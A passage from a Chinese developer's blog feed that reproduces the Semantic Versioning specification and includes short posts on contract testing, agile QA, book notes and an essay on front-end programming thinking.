        <content type="html"><![CDATA[<h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2><p>如果不是在一个非常规范的公司,有时候甚至没有软件发布包版本管理这件事,对于很多语言来说,并没有提供包管理的相关特性,比如PHP,从事PHP多年,但是我们再发布的时候流程并不是非常规范。版本之间的依赖也比较混乱,于是有人提出了语义化版本管理的规范</p><p><strong>资料来源</strong></p><p>网站: <a href="http://semver.org/lang/zh-CN/" target="_blank" rel="noopener">http://semver.org/lang/zh-CN/</a><br>Github: <a href="https://github.com/mojombo/semver" target="_blank" rel="noopener">https://github.com/mojombo/semver</a></p><p><strong>一些工具检查或生成</strong></p><ul><li>semantic-release - <a href="https://github.com/semantic-release/semantic-release" target="_blank" rel="noopener">https://github.com/semantic-release/semantic-release</a></li></ul><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Given a version number MAJOR.MINOR.PATCH, increment the:</p><ol><li>MAJOR version when you make incompatible API changes,</li><li>MINOR version when you add functionality in a backwards-compatible<br>manner, and</li><li>PATCH version when you make backwards-compatible bug fixes.</li></ol><p>Additional labels for pre-release and build metadata are available as extensions<br>to the MAJOR.MINOR.PATCH format.</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In the world of software management there exists a dreaded place called<br>“dependency hell.” The bigger your system grows and the more packages you<br>integrate into your software, the more likely you are to find yourself, one<br>day, in this pit of despair.</p><p>In systems with many dependencies, releasing new package versions can quickly<br>become a nightmare. If the dependency specifications are too tight, you are in<br>danger of version lock (the inability to upgrade a package without having to<br>release new versions of every dependent package). If dependencies are<br>specified too loosely, you will inevitably be bitten by version promiscuity<br>(assuming compatibility with more future versions than is reasonable).<br>Dependency hell is where you are when version lock and/or version promiscuity<br>prevent you from easily and safely moving your project forward.</p><p>As a solution to this problem, I propose a simple set of rules and<br>requirements that dictate how version numbers are assigned and incremented.<br>These rules are based on but not necessarily limited to pre-existing<br>widespread common practices in use in both closed and open-source software.<br>For this system to work, you first need to declare a public API. This may<br>consist of documentation or be enforced by the code itself. Regardless, it is<br>important that this API be clear and precise. Once you identify your public<br>API, you communicate changes to it with specific increments to your version<br>number. Consider a version format of X.Y.Z (Major.Minor.Patch). Bug fixes not<br>affecting the API increment the patch version, backwards compatible API<br>additions/changes increment the minor version, and backwards incompatible API<br>changes increment the major version.</p><p>I call this system “Semantic Versioning.” Under this scheme, version numbers<br>and the way they change convey meaning about the underlying code and what has<br>been modified from one version to the next.</p><h2 id="Semantic-Versioning-Specification-SemVer"><a href="#Semantic-Versioning-Specification-SemVer" class="headerlink" title="Semantic Versioning Specification (SemVer)"></a>Semantic Versioning Specification (SemVer)</h2><p>The key words “MUST”, “MUST NOT”, “REQUIRED”, “SHALL”, “SHALL NOT”, “SHOULD”,<br>“SHOULD NOT”, “RECOMMENDED”, “MAY”, and “OPTIONAL” in this document are to be<br>interpreted as described in <a href="http://tools.ietf.org/html/rfc2119" target="_blank" rel="noopener">RFC 2119</a>.</p><ol><li><p>Software using Semantic Versioning MUST declare a public API. This API<br>could be declared in the code itself or exist strictly in documentation.<br>However it is done, it SHOULD be precise and comprehensive.</p></li><li><p>A normal version number MUST take the form X.Y.Z where X, Y, and Z are<br>non-negative integers, and MUST NOT contain leading zeroes. X is the<br>major version, Y is the minor version, and Z is the patch version.<br>Each element MUST increase numerically. For instance: 1.9.0 -&gt; 1.10.0 -&gt; 1.11.0.</p></li><li><p>Once a versioned package has been released, the contents of that version<br>MUST NOT be modified. Any modifications MUST be released as a new version.</p></li><li><p>Major version zero (0.y.z) is for initial development. Anything MAY change<br>at any time. The public API SHOULD NOT be considered stable.</p></li><li><p>Version 1.0.0 defines the public API. The way in which the version number<br>is incremented after this release is dependent on this public API and how it<br>changes.</p></li><li><p>Patch version Z (x.y.Z | x &gt; 0) MUST be incremented if only backwards<br>compatible bug fixes are introduced. A bug fix is defined as an internal<br>change that fixes incorrect behavior.</p></li><li><p>Minor version Y (x.Y.z | x &gt; 0) MUST be incremented if new, backwards<br>compatible functionality is introduced to the public API. It MUST be<br>incremented if any public API functionality is marked as deprecated. It MAY be<br>incremented if substantial new functionality or improvements are introduced<br>within the private code. It MAY include patch level changes. Patch version<br>MUST be reset to 0 when minor version is incremented.</p></li><li><p>Major version X (X.y.z | X &gt; 0) MUST be incremented if any backwards<br>incompatible changes are introduced to the public API. It MAY also include minor<br>and patch level changes. Patch and minor version MUST be reset to 0 when major<br>version is incremented.</p></li><li><p>A pre-release version MAY be denoted by appending a hyphen and a<br>series of dot separated identifiers immediately following the patch<br>version. Identifiers MUST comprise only ASCII alphanumerics and hyphen<br>[0-9A-Za-z-]. Identifiers MUST NOT be empty. Numeric identifiers MUST<br>NOT include leading zeroes. Pre-release versions have a lower<br>precedence than the associated normal version. A pre-release version<br>indicates that the version is unstable and might not satisfy the<br>intended compatibility requirements as denoted by its associated<br>normal version. Examples: 1.0.0-alpha, 1.0.0-alpha.1, 1.0.0-0.3.7,<br>1.0.0-x.7.z.92.</p></li><li><p>Build metadata MAY be denoted by appending a plus sign and a series of dot<br>separated identifiers immediately following the patch or pre-release version.<br>Identifiers MUST comprise only ASCII alphanumerics and hyphen [0-9A-Za-z-].<br>Identifiers MUST NOT be empty. Build metadata MUST be ignored when determining<br>version precedence. Thus two versions that differ only in the build metadata,<br>have the same precedence. Examples: 1.0.0-alpha+001, 1.0.0+20130313144700,<br>1.0.0-beta+exp.sha.5114f85.</p></li><li><p>Precedence refers to how versions are compared to each other when ordered.<br>Precedence MUST be calculated by separating the version into major, minor, patch<br>and pre-release identifiers in that order (Build metadata does not figure<br>into precedence). Precedence is determined by the first difference when<br>comparing each of these identifiers from left to right as follows: Major, minor,<br>and patch versions are always compared numerically. Example: 1.0.0 &lt; 2.0.0 &lt;<br>2.1.0 &lt; 2.1.1. When major, minor, and patch are equal, a pre-release version has<br>lower precedence than a normal version. Example: 1.0.0-alpha &lt; 1.0.0. Precedence<br>for two pre-release versions with the same major, minor, and patch version MUST<br>be determined by comparing each dot separated identifier from left to right<br>until a difference is found as follows: identifiers consisting of only digits<br>are compared numerically and identifiers with letters or hyphens are compared<br>lexically in ASCII sort order. Numeric identifiers always have lower precedence<br>than non-numeric identifiers. A larger set of pre-release fields has a higher<br>precedence than a smaller set, if all of the preceding identifiers are equal.<br>Example: 1.0.0-alpha &lt; 1.0.0-alpha.1 &lt; 1.0.0-alpha.beta &lt; 1.0.0-beta &lt;<br>1.0.0-beta.2 &lt; 1.0.0-beta.11 &lt; 1.0.0-rc.1 &lt; 1.0.0.</p></li></ol><h2 id="Why-Use-Semantic-Versioning"><a href="#Why-Use-Semantic-Versioning" class="headerlink" title="Why Use Semantic Versioning?"></a>Why Use Semantic Versioning?</h2><p>This is not a new or revolutionary idea. In fact, you probably do something<br>close to this already. The problem is that “close” isn’t good enough. Without<br>compliance to some sort of formal specification, version numbers are<br>essentially useless for dependency management. By giving a name and clear<br>definition to the above ideas, it becomes easy to communicate your intentions<br>to the users of your software. Once these intentions are clear, flexible (but<br>not too flexible) dependency specifications can finally be made.</p><p>A simple example will demonstrate how Semantic Versioning can make dependency<br>hell a thing of the past. Consider a library called “Firetruck.” It requires a<br>Semantically Versioned package named “Ladder.” At the time that Firetruck is<br>created, Ladder is at version 3.1.0. Since Firetruck uses some functionality<br>that was first introduced in 3.1.0, you can safely specify the Ladder<br>dependency as greater than or equal to 3.1.0 but less than 4.0.0. Now, when<br>Ladder version 3.1.1 and 3.2.0 become available, you can release them to your<br>package management system and know that they will be compatible with existing<br>dependent software.</p><p>As a responsible developer you will, of course, want to verify that any<br>package upgrades function as advertised. The real world is a messy place;<br>there’s nothing we can do about that but be vigilant. What you can do is let<br>Semantic Versioning provide you with a sane way to release and upgrade<br>packages without having to roll new versions of dependent packages, saving you<br>time and hassle.</p><p>If all of this sounds desirable, all you need to do to start using Semantic<br>Versioning is to declare that you are doing so and then follow the rules. Link<br>to this website from your README so others know the rules and can benefit from<br>them.</p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="How-should-I-deal-with-revisions-in-the-0-y-z-initial-development-phase"><a href="#How-should-I-deal-with-revisions-in-the-0-y-z-initial-development-phase" class="headerlink" title="How should I deal with revisions in the 0.y.z initial development phase?"></a>How should I deal with revisions in the 0.y.z initial development phase?</h3><p>The simplest thing to do is start your initial development release at 0.1.0<br>and then increment the minor version for each subsequent release.</p><h3 id="How-do-I-know-when-to-release-1-0-0"><a href="#How-do-I-know-when-to-release-1-0-0" class="headerlink" title="How do I know when to release 1.0.0?"></a>How do I know when to release 1.0.0?</h3><p>If your software is being used in production, it should probably already be<br>1.0.0. If you have a stable API on which users have come to depend, you should<br>be 1.0.0. If you’re worrying a lot about backwards compatibility, you should<br>probably already be 1.0.0.</p><h3 id="Doesn’t-this-discourage-rapid-development-and-fast-iteration"><a href="#Doesn’t-this-discourage-rapid-development-and-fast-iteration" class="headerlink" title="Doesn’t this discourage rapid development and fast iteration?"></a>Doesn’t this discourage rapid development and fast iteration?</h3><p>Major version zero is all about rapid development. If you’re changing the API<br>every day you should either still be in version 0.y.z or on a separate<br>development branch working on the next major version.</p><h3 id="If-even-the-tiniest-backwards-incompatible-changes-to-the-public-API-require-a-major-version-bump-won’t-I-end-up-at-version-42-0-0-very-rapidly"><a href="#If-even-the-tiniest-backwards-incompatible-changes-to-the-public-API-require-a-major-version-bump-won’t-I-end-up-at-version-42-0-0-very-rapidly" class="headerlink" title="If even the tiniest backwards incompatible changes to the public API require a major version bump, won’t I end up at version 42.0.0 very rapidly?"></a>If even the tiniest backwards incompatible changes to the public API require a major version bump, won’t I end up at version 42.0.0 very rapidly?</h3><p>This is a question of responsible development and foresight. Incompatible<br>changes should not be introduced lightly to software that has a lot of<br>dependent code. The cost that must be incurred to upgrade can be significant.<br>Having to bump major versions to release incompatible changes means you’ll<br>think through the impact of your changes, and evaluate the cost/benefit ratio<br>involved.</p><h3 id="Documenting-the-entire-public-API-is-too-much-work"><a href="#Documenting-the-entire-public-API-is-too-much-work" class="headerlink" title="Documenting the entire public API is too much work!"></a>Documenting the entire public API is too much work!</h3><p>It is your responsibility as a professional developer to properly document<br>software that is intended for use by others. Managing software complexity is a<br>hugely important part of keeping a project efficient, and that’s hard to do if<br>nobody knows how to use your software, or what methods are safe to call. In<br>the long run, Semantic Versioning, and the insistence on a well defined public<br>API can keep everyone and everything running smoothly.</p><h3 id="What-do-I-do-if-I-accidentally-release-a-backwards-incompatible-change-as-a-minor-version"><a href="#What-do-I-do-if-I-accidentally-release-a-backwards-incompatible-change-as-a-minor-version" class="headerlink" title="What do I do if I accidentally release a backwards incompatible change as a minor version?"></a>What do I do if I accidentally release a backwards incompatible change as a minor version?</h3><p>As soon as you realize that you’ve broken the Semantic Versioning spec, fix<br>the problem and release a new minor version that corrects the problem and<br>restores backwards compatibility. Even under this circumstance, it is<br>unacceptable to modify versioned releases. If it’s appropriate,<br>document the offending version and inform your users of the problem so that<br>they are aware of the offending version.</p><h3 id="What-should-I-do-if-I-update-my-own-dependencies-without-changing-the-public-API"><a href="#What-should-I-do-if-I-update-my-own-dependencies-without-changing-the-public-API" class="headerlink" title="What should I do if I update my own dependencies without changing the public API?"></a>What should I do if I update my own dependencies without changing the public API?</h3><p>That would be considered compatible since it does not affect the public API.<br>Software that explicitly depends on the same dependencies as your package<br>should have their own dependency specifications and the author will notice any<br>conflicts. Determining whether the change is a patch level or minor level<br>modification depends on whether you updated your dependencies in order to fix<br>a bug or introduce new functionality. I would usually expect additional code<br>for the latter instance, in which case it’s obviously a minor level increment.</p><h3 id="What-if-I-inadvertently-alter-the-public-API-in-a-way-that-is-not-compliant-with-the-version-number-change-i-e-the-code-incorrectly-introduces-a-major-breaking-change-in-a-patch-release"><a href="#What-if-I-inadvertently-alter-the-public-API-in-a-way-that-is-not-compliant-with-the-version-number-change-i-e-the-code-incorrectly-introduces-a-major-breaking-change-in-a-patch-release" class="headerlink" title="What if I inadvertently alter the public API in a way that is not compliant with the version number change (i.e. the code incorrectly introduces a major breaking change in a patch release)?"></a>What if I inadvertently alter the public API in a way that is not compliant with the version number change (i.e. the code incorrectly introduces a major breaking change in a patch release)?</h3><p>Use your best judgment. If you have a huge audience that will be drastically<br>impacted by changing the behavior back to what the public API intended, then<br>it may be best to perform a major version release, even though the fix could<br>strictly be considered a patch release. Remember, Semantic Versioning is all<br>about conveying meaning by how the version number changes. If these changes<br>are important to your users, use the version number to inform them.</p><h3 id="How-should-I-handle-deprecating-functionality"><a href="#How-should-I-handle-deprecating-functionality" class="headerlink" title="How should I handle deprecating functionality?"></a>How should I handle deprecating functionality?</h3><p>Deprecating existing functionality is a normal part of software development and<br>is often required to make forward progress. When you deprecate part of your<br>public API, you should do two things: (1) update your documentation to let<br>users know about the change, (2) issue a new minor release with the deprecation<br>in place. Before you completely remove the functionality in a new major release<br>there should be at least one minor release that contains the deprecation so<br>that users can smoothly transition to the new API.</p><h3 id="Does-SemVer-have-a-size-limit-on-the-version-string"><a href="#Does-SemVer-have-a-size-limit-on-the-version-string" class="headerlink" title="Does SemVer have a size limit on the version string?"></a>Does SemVer have a size limit on the version string?</h3><p>No, but use good judgment. A 255 character version string is probably overkill,<br>for example. Also, specific systems may impose their own limits on the size of<br>the string.</p><h3 id="Is-“v1-2-3”-a-semantic-version"><a href="#Is-“v1-2-3”-a-semantic-version" class="headerlink" title="Is “v1.2.3” a semantic version?"></a>Is “v1.2.3” a semantic version?</h3><p>No, “v1.2.3” is not a semantic version. However, prefixing a semantic version<br>with a “v” is a common way (in English) to indicate it is a version number.<br>Abbreviating “version” as “v” is often seen with version control. Example:<br><code>git tag v1.2.3 -m &quot;Release version 1.2.3&quot;</code>, in which case “v1.2.3” is a tag<br>name and the semantic version is “1.2.3”.</p><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>The Semantic Versioning specification is authored by <a href="http://tom.preston-werner.com" target="_blank" rel="noopener">Tom<br>Preston-Werner</a>, inventor of Gravatar and<br>cofounder of GitHub.</p><p>If you’d like to leave feedback, please <a href="https://github.com/mojombo/semver/issues" target="_blank" rel="noopener">open an issue on<br>GitHub</a>.</p><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>Creative Commons - CC BY 3.0<br><a href="http://creativecommons.org/licenses/by/3.0/" target="_blank" rel="noopener">http://creativecommons.org/licenses/by/3.0/</a></p>]]></content>
      
      
      <categories>
          
          <category> se </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API的contract测试之Pact</title>
      <link href="/test/test/Contract%20testing%20&amp;%20PACT/"/>
      <url>/test/test/Contract%20testing%20&amp;%20PACT/</url>
      
        <content type="html"><![CDATA[<h2 id="why"><a href="#why" class="headerlink" title="why?"></a>why?</h2><p>当我们构建API的时候，需要保证API输出稳定，因此我们可以使用契约测试。<br>我们可以定义一个契约文件，然后消费者和API提供者并行开发，最终进行集成测试。</p><h2 id="pact-和-contact的区别"><a href="#pact-和-contact的区别" class="headerlink" title="pact 和 contact的区别"></a>pact 和 contact的区别</h2><p>pact 是contact测试的一个实现</p><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><ul><li>pact文档 <a href="https://docs.pact.io" target="_blank" rel="noopener">https://docs.pact.io</a></li><li>Java 例子 <a href="https://github.com/DiUS/pact-workshop-jvm" target="_blank" rel="noopener">https://github.com/DiUS/pact-workshop-jvm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>QA in agile</title>
      <link href="/qa/test/QA%20in%20agile/"/>
      <url>/qa/test/QA%20in%20agile/</url>
      
        <content type="html"><![CDATA[<h2 id="常用QA概念"><a href="#常用QA概念" class="headerlink" title="常用QA概念"></a>常用QA概念</h2><p>探索性测试:同时设计测试和执行测试。探索性测试有时候会与即兴测试（ad hoc testing）混淆。即兴测试通常是指临时准备的、即兴的Bug搜索测试过程。从定义可以看出，谁都可以做即兴测试。由Cem Kaner提出的探索性测试，相比即兴测试是一种精致的、有思想的过程。</p><p>测试金字塔: unit-&gt;service-&gt;UI, 伴随测试成本投入,收益减少。unit为测试性价比最高的方式<br>冒烟测试: sanity测试,快速验证应用是否能工作。<br>BDD测试: 基于业务的测试思想。<br>E2E测试: 端对端测试。<br>集成测试:<br>Functional: E2E测试。</p><h2 id="常用测试工具"><a href="#常用测试工具" class="headerlink" title="常用测试工具"></a>常用测试工具</h2><ul><li>selenium 可以驱动浏览器，模拟真实用户<br>-</li></ul><h2 id="Case-设计"><a href="#Case-设计" class="headerlink" title="Case 设计"></a>Case 设计</h2><p>A test case, is a set of test inputs, execution conditions, and expected results developed for a particular objective, such as to exercise a particular program path or to verify compliance with a specific requirement.</p><h3 id="Common-Methods-Black-box"><a href="#Common-Methods-Black-box" class="headerlink" title="Common Methods - Black box"></a>Common Methods - Black box</h3><ul><li>Boundary Value Analysis 边界值分析</li><li>Equivalence Partitioning 等价划分</li><li>Causal Diagram 因果图</li><li>Decision Table 判定表</li></ul><h3 id="Common-Methods-White-box"><a href="#Common-Methods-White-box" class="headerlink" title="Common Methods - White box"></a>Common Methods - White box</h3><ul><li>Logical coverage<ul><li>statement coverage</li><li>Branch coverage</li><li>Path coverage</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> qa </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>极简欧洲史</title>
      <link href="/reading-writing/reading&amp;writing/%E6%9E%81%E7%AE%80%E6%AC%A7%E6%B4%B2%E5%8F%B2/"/>
      <url>/reading-writing/reading&amp;writing/%E6%9E%81%E7%AE%80%E6%AC%A7%E6%B4%B2%E5%8F%B2/</url>
      
        <content type="html"><![CDATA[<p>这是一本及其简单的书，即使想我这种历史文盲也一样能读懂，畅行无阻，可见是多么简单易学；这是一本及其有趣的书，从希腊出发讲到了罗马帝国的兴衰，跑到帝国的边际蛮荒处溜了一圈，又回到的希腊，述景抒情。这是一本简单，有趣，能从初读到初四的小册子，假如初中/高中历史像这样讲，倒也有趣。</p><p>童话和罗曼史总是喜欢讲国王、公主、王子的故事，对不起，希腊没有。直立人的出现是在非洲、亚洲和欧洲，但是文明却最先在欧洲和亚洲出现，用自由、勇敢和聪明来形容来希腊人一点儿也不过分。他们建立起一个一个由共同爱好和兴趣的城邦，学者从一个城邦穿梭到另外一个城邦，那里有苏格拉底、柏拉图、亚里士多德，还有建立数学几何的欧几里得。希腊有神，但是更加趋于理性，希腊人的自然科学的意识臻于完美。同中国东周的百家争鸣相比，就像是老子的理想国“小国寡民，老死不相往来”。</p><p>如果希腊的结局就是幸福而快乐的生活着，那么历史就不是历史，而像极了一部童话故事。而后希腊文明的几百年中，不断罗马人侵犯，希腊和罗马相比就像一个手无缚鸡之力的书生落在了草寇的手中。罗马人在希腊的地盘上建立了他的帝国，而被征服的希腊人，也还可有利用的地方，希腊人变成了，这个山寨土匪的管家，继续管理着这个国家。罗马人信仰基督，于是出现了神父。罗马帝国的建立，社会出现了3个阶层，负责打仗的贵族，主持教务的神父，辛苦劳作的平民。按照日后征服罗马的日耳曼蛮族的说法是，以流血而生的为荣，以流汗劳作为生的为耻。罗马按照流血和流汗的区分，划分了等级。</p><p>《三体3》讲的是黑暗森林的故事，在没有光线的黑暗森林中，暴露自己的个体最先被消灭，软弱的个体连进入的资格都没有。欧洲从希腊光明开始而后进入被征服和教会统治的黑暗中世纪，最终到了文艺复兴，科技革命，带动了整个世界。波兰、德国直到二战前都是世界的物理学中心。 </p><p>豆瓣观点<br>  1、预设立场，然后阉割历史，使其呈现出想象的样子。用这样的历史教育大众，使大众从历史的必然性不得不认可预设的立场，然后做事也就符合这样的历史规律，最终预设的立场变成了现实正在发生的历史。<br>    2、大陆历史教材也是逻辑推动的，只不过是政治逻辑…骂娘冲动+1<br>    3、历史是历史上的人想让我们知道的事，这本书不然。</p>]]></content>
      
      
      <categories>
          
          <category> reading&amp;writing </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>暗时间摘录</title>
      <link href="/reading-writing/reading&amp;writing/%E6%9A%97%E6%97%B6%E9%97%B4%E6%91%98%E5%BD%95/"/>
      <url>/reading-writing/reading&amp;writing/%E6%9A%97%E6%97%B6%E9%97%B4%E6%91%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>这本书讲时间管理,讲方法论,讲逻辑和认知,但这是一本洗脑书,或者是一本宁愿被洗脑却值得一看的书.</p><p>1,暗时间：习惯将问题放入大脑的潜意识思考  (厕所也许是个好位置)<br>2, 习惯于专注所带来的成就感    (专注的力量很大,这是对于提高效率来说,但是做到集中精神却很难)<br>3,设计自己的目标进度条，不要过早地退出尝试的循环。原始的大脑常常使我们高估失败带来的损失和困难产生的心理障碍。 (step by step 即使很慢,至少有成果)<br>4, 学习时，因为作者习惯的文法和自己习惯的文法不尽相同，所以（1）应当用自己的话将学到的知识重复一遍，加强记忆与大脑熟悉数据的强联系。（2）将知识抽象，使得这种强联系的范围更广，试用性更广。<br>5,学习新知识时的三个问题（1）它的本质（2）第一原则（3）知识结构；<br>6,乘着对一件事有热情，一股脑把往事开头难的那个阶段跨过<br>7,todo list 是个必备的东西<br>8,制定简要的阅读计划，阅读分类<br>9,总结很重要,看了的东西还是原作者的,总结会让它变成自己的<br>10,看一个人，要看他的朋友和兴趣，他的阅读和他见的人<br>11,本能仅仅是原始大脑没有进化完全的结果<br>12,困难的路越走越容易，容易的路越走越困难。<br>13,直接问到问题的答案同时意味着你永远倒要靠别人的大脑来获得答案。<br>14,生活就像一条漫长的跑道，在你遇到障碍的时候，如果你总是屈从于大脑的低级模块，选择绕过，那么你最终将越来越发现只能绕过障碍，而无力半开。如果你大多数时候选择搬开障碍，虽然从表面上看，跟那些绕过障碍的人相比，你的速度慢了很多，但随着你越来越熟练地解决障碍，最终你的速冻将远远超过总是“抄近道”的。   </p>]]></content>
      
      
      <categories>
          
          <category> reading&amp;writing </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>你不是在写前端,而是在编程</title>
      <link href="/reading-writing/reading&amp;writing/%E4%BD%A0%E4%B8%8D%E6%98%AF%E5%9C%A8%E5%86%99%E5%89%8D%E7%AB%AF,%E8%80%8C%E6%98%AF%E5%9C%A8%E7%BC%96%E7%A8%8B/"/>
      <url>/reading-writing/reading&amp;writing/%E4%BD%A0%E4%B8%8D%E6%98%AF%E5%9C%A8%E5%86%99%E5%89%8D%E7%AB%AF,%E8%80%8C%E6%98%AF%E5%9C%A8%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="从切图开始"><a href="#从切图开始" class="headerlink" title="从切图开始"></a>从切图开始</h3><p>在几周以前的一个周末去了趟上海，除了感受了魔都的快节奏生活之外，作为前端的面试官参加了上海分公司的面试Open Day活动。<br>在Open Day，候选人一天就能拿到Offer，但是需要完成现场作业、结对编程等环节。我们的现场作业题目是模拟操作一个火星车方阵，根据输入的数据，程序来完成放置火星车、左右转、前进等场景。这个题目实现并不难，设计该题目的目的是为了考察候选人程序设计、代码风格和工程化的能力。<br>     很快，陆陆续续有一些候选人完成了现场作业，有的是在Node.js平台上完成，用变量模拟数据的输入，用面向对象的方式给火星车分配了实例，然后操作这些实例完成了任务。还有一些使用了JavaScript文件和一个简单的HTML文件加载到浏览器中运行。随着时间的过去，一个女生迟迟没有提交，时间到后，我上前检查，她编写一个HTML页面，然后使用JavaScript操作dom元素来了移动页面上的”火星车”，JavaScript脚本耦合在HTML文档中。这个女生告诉我她以为不能使用JQuery，于是使用原生JavaScript，因此遇到了很多问题以至于不能及时完成。结果可想而知。<br>     这件事给我的触动很大，也为这位候选人没能通过面试感到遗憾。其实我们期待的作业是一个可以正确运行的”程序”，无论是面向对象的设计还是函数式的设计，而这位候选人关注在”页面”，甚至HTML和JavaScript都没有分离，只有几个响应DOM事件的JavaScript函数。显然这位候选人对我们的题目理解并不一样，那么不同工程师之间的思维差异是怎样的呢。<br> 我想到了 “编程思想”，我不算正经的科班生，但犹记得在读书期间像老师请教过关于编程的内容，老师提到最多的就是”编程思想”。在后面的前几年开发生涯中，也在不断思考这个问题，怎么样才能算具有开发思想，怎么去设计程序和组织代码才是最好的。貌似在做过不少项目，上线过很多应用后，也没有得到答案，甚至随着身边的人水平不断增高，这个问题不再被提起。 在前几年，前后端开发还没有分离时，当时的开发模式为前端编写页面、CSS和少量的JavaScript，随后由后端开发者来集成到项目中去。前端不仅备受歧视，并且因为交付产物不是完整的程序，甚至并不被当做”程序员”，业内黑话叫 “切页面的”。当时的行情是会使用jQuery或原生JS编写组件的很值钱，否则”页面仔”并不值钱。 </p><h3 id="怎么从前端找到编程思维？"><a href="#怎么从前端找到编程思维？" class="headerlink" title="怎么从前端找到编程思维？"></a>怎么从前端找到编程思维？</h3><p>前后端分离是一个非常好的契机，改变了前端的开发模式，前后端分离后的前端项目又叫做单页应用（SPA），这种应用不像传统的页面会发生跳转，页面的跳转由视图的切换代替。 </p><p>前后端分离后开发者需要理解的第一件事是：前端应用变成了一个运行在浏览器的完整的程序。JavaScript不再是完成页面上特效的小玩意儿了，需要承担起管理数据、处理用户相应和渲染页面的职责。最早带来这种革命的应用是Gmail, Gmail被认为是第一个富前端应用程序。随后Backbone把MVC思维带到了前端，AngularJS的双向绑定让富前端开发变得非常容易和简单，开启了富前端应用第一个高潮。<br>     前端开发是做一个完整的应用程序的例子是一个代办记事列表应用，这也是前端开发框架往往使用的的经典案例，不亚于Hello world。马上体验：<a href="http://todomvc.com" target="_blank" rel="noopener">http://todomvc.com</a></p><h3 id="程序是什么？"><a href="#程序是什么？" class="headerlink" title="程序是什么？"></a>程序是什么？</h3><p>我们说要具有编程思维，那我们先说说程序是什么，百科的说法是： </p><p>计算机程序又称“计算机软件”，通过指令的顺序，使计算机能按所要求的功能进行精确记述的逻辑方法。 </p><p>这个定义需要首先理解计算机是什么，然而我们不用想的这么复杂。通俗来说，计算机就像一个听话而行事准确的奴隶，人类只需要给出确切的命令和输入就可以干活，否则就会报错。 前端应用程序和服务器、桌面程序的差异在于他们的运行环境不同。桌面程序可以随意调用系统API，实现几乎所有的功能；服务器程序没有界面，就像《黑客帝国》中被关起来的锁匠一样，暗无天日的解决问题即可；前端应用寄宿在浏览器这个容器中，就像银行柜员一样响应用的需求，传递给后台。 </p><p>传统程序把数据和页面混合后发送给浏览器，现代的前端应用是把页面和JavaScript发送给浏览器，然后前端接了一个小水管（API）获取数据，然后前端自己加工渲染到页面。于是web前端应用程序越来越像真正的客户端应用了。 </p><h3 id="建立前端的APP的编程思想"><a href="#建立前端的APP的编程思想" class="headerlink" title="建立前端的APP的编程思想"></a>建立前端的APP的编程思想</h3><p>有一道经典的前端面试题是考察浏览器载入页面时的加载顺序，从这个角度出发，页面的加载到用户关闭窗口，就类似于桌面客户端启动和退出。 因为传统的的页面，从加载渲染到用户关闭这个窗口只用了很短的时间，窗口随即被销毁，就像一个一次性的用品，浏览器和HTTP协议帮我们管理了很多东西，因此我们不比考虑数据的管理、内存的分配、代码的组织。 </p><p>当我们的从多页面开发转向到单页应用时，这些问题就不得不重新思考： </p><p><em>APP的生命周期</em> 在多页面开发时，数据和HTML混合后和css、JavaScript片段被发送到浏览器，HTML和CSS被渲染后JavaScript需要做的只是注册事件，大部分事情都是服务器和浏览器来完成的，JavaScript起到的作用并不是特别大。这种方式造成了用户操作时反复请求、加载、渲染，用户会受到白屏、等待和操作不流畅等糟糕体验。在单页应用时代，HTML\css\js被作为入口打包后发送给浏览器，然后使用JavaScript像普通客户端程序一样启动，开始拉取数据、构建页面、绑定事件后对用户做出响应，用户发生操作再进行拉取数据、重新渲染，页面之间使用DOM视图切换完成，最终用户退出该页面后数据被释放。 </p><p><em>数据管理和垃圾回收</em> 前后端分离的本质是HTML/CSS/JS组成的应用程序和数据进行分离，HTML/CSS/JS从web容器中加载，数据从API加载，数据的处理需要JavaScript来完成，这也是为什么最早的MVC框架Backbone强制依赖了集合数据处理库underscore，在React的生态中很多开发者喜欢使用loadash。多页面开发时，页面切换或刷新后，数据和事件会被重置，但现在需要自己管理，直到用户退出前，程序持续运行，因此需要特别考虑一些数据的释放、变量引用指针是否正确、事件是否被重复绑定等问题。 </p><p><em>组织代码</em> 在之前，JavaScript只是被当做浏览器的一个简单脚本。几乎没有代码结构而言，大量的行内的代码，好一点的放置到页面底部，或者使用外部JavaScript文件。慢慢的发展出一堆函数和方法集合的库，然后有一些面向对象的实践。因为页面加载一次后就被释放，JavaScript往往是小量的，并且通常每个页面之间用到的独立JavaScript片段构成。单页应用中，应用程序被作为一个整体加载，程序运行的逻辑发生了不小的变化： </p><ol><li>程序应该使用统一的入口来初始化整个应用 </li><li>对各个功能组件进行拆分。拆分是为了更好的组合，只有良好的解耦才能最大化的重新组合各个组件 </li><li>学习面向对象思想。面向对象可以让组件职责更加清晰 </li><li>数据和视图拆分，使用数据驱动视图 </li><li><p>了解设计模式。设计模式是组织大型应用程序代码的”套路”，可以自己设计好良好的代码，也可以参考现成的模式。例如当我第一次看到Redux的dispatch实现时，脑子第一想法是这玩意儿和Window上的MFC消息机制非常像。 </p><p>总之，单页应用是一个独立的应用程序，而不是”堆砌的意大利面条的代码”。 </p></li></ol><p><em>工程化</em>  既然是独立的应用程序，为什么前端不能工程化。 我们的程序是需要运行在浏览器中，加上可能会使用ES6、Less等非原生的开发工具，就需要进行构建编译然后打包成能在浏览器上运行的程序。 这个过程在C/C++中有make，JAVA中有Maven。而前端的工程化生态比较分散，JavaScript的预处理语言、包管理工具、构建工具都有很多。 </p><p>前端的工程化需要考虑的有： </p><ol><li>合理的工程结构</li><li>工程构建</li><li>版本管理 </li><li>持续集成 